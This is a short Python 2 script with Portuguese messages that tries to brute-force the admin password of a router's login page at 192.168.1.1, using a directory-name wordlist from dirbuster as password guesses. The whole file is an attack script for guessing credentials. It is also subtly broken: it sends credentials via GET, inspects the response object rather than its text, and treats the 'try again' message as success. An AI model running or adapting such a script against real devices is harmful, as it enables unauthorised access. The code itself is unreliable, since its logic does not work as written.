#coding: UTF-8
import requests

url = "http://192.168.1.1/login.asp"
arquivo = open("/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt")
linha = arquivo.readlines()

for senha in linha:    
    dados = {"username":"admin",
            "password":senha}

    respotas = requests.get(url,data=dados)

    if  "Insira novamente!" in respotas:
        print "Á senha é:",linha
        break
    else:
        print "Não é a senha:",senha
        
